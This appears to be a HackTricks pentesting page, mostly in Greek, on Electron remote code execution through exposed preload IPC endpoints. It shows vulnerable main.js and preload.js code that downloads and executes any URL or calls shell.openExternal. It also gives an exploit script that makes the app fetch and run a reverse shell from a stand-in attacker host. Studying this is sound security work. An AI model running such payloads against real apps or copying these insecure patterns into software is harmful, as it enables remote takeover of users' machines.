# Electron contextIsolation RCE via IPC

{{#include ../../../banners/hacktricks-training.md}}

Αν το script preload εκθέτει ένα IPC endpoint από το αρχείο main.js, η διαδικασία renderer θα μπορεί να έχει πρόσβαση σε αυτό και αν είναι ευάλωτο, μπορεί να είναι δυνατή μια RCE.

**Οι περισσότερες από αυτές τις παραδείγματα έχουν ληφθεί από εδώ** [**https://www.youtube.com/watch?v=xILfQGkLXQo**](https://www.youtube.com/watch?v=xILfQGkLXQo). Δείτε το βίντεο για περισσότερες πληροφορίες.

## Example 0

Παράδειγμα από [https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own?slide=21](https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own?slide=21) (έχετε το πλήρες παράδειγμα του πώς το MS Teams εκμεταλλεύτηκε το XSS για RCE σε αυτές τις διαφάνειες, αυτό είναι απλώς ένα πολύ βασικό παράδειγμα):

<figure><img src="../../../images/image (9) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Example 1

Δείτε πώς το `main.js` ακούει στο `getUpdate` και θα **κατεβάσει και θα εκτελέσει οποιοδήποτε URL** περάσει.\
Δείτε επίσης πώς το `preload.js` **εκθέτει οποιοδήποτε IPC** γεγονός από το main.
```javascript
// Part of code of main.js
ipcMain.on("getUpdate", (event, url) => {
console.log("getUpdate: " + url)
mainWindow.webContents.downloadURL(url)
mainWindow.download_url = url
})

mainWindow.webContents.session.on(
"will-download",
(event, item, webContents) => {
console.log("downloads path=" + app.getPath("downloads"))
console.log("mainWindow.download_url=" + mainWindow.download_url)
url_parts = mainWindow.download_url.split("/")
filename = url_parts[url_parts.length - 1]
mainWindow.downloadPath = app.getPath("downloads") + "/" + filename
console.log("downloadPath=" + mainWindow.downloadPath)
// Set the save path, making Electron not to prompt a save dialog.
item.setSavePath(mainWindow.downloadPath)

item.on("updated", (event, state) => {
if (state === "interrupted") {
console.log("Download is interrupted but can be resumed")
} else if (state === "progressing") {
if (item.isPaused()) console.log("Download is paused")
else console.log(`Received bytes: ${item.getReceivedBytes()}`)
}
})

item.once("done", (event, state) => {
if (state === "completed") {
console.log("Download successful, running update")
fs.chmodSync(mainWindow.downloadPath, 0755)
var child = require("child_process").execFile
child(mainWindow.downloadPath, function (err, data) {
if (err) {
console.error(err)
return
}
console.log(data.toString())
})
} else console.log(`Download failed: ${state}`)
})
}
)
```

```javascript
// Part of code of preload.js
window.electronSend = (event, data) => {
ipcRenderer.send(event, data)
}
```
Εκμετάλλευση:
```html
<script>
electronSend("getUpdate", "https://attacker.com/path/to/revshell.sh")
</script>
```
## Παράδειγμα 2

Αν το preload script εκθέτει άμεσα στον renderer έναν τρόπο να καλέσει το `shell.openExternal`, είναι δυνατόν να αποκτηθεί RCE.
```javascript
// Part of preload.js code
window.electronOpenInBrowser = (url) => {
shell.openExternal(url)
}
```
## Παράδειγμα 3

Εάν το preload script εκθέτει τρόπους για πλήρη επικοινωνία με τη βασική διαδικασία, μια XSS θα είναι σε θέση να στείλει οποιοδήποτε γεγονός. Η επίδραση αυτού εξαρτάται από το τι εκθέτει η βασική διαδικασία όσον αφορά το IPC.
```javascript
window.electronListen = (event, cb) => {
ipcRenderer.on(event, cb)
}

window.electronSend = (event, data) => {
ipcRenderer.send(event, data)
}
```
{{#include ../../../banners/hacktricks-training.md}}
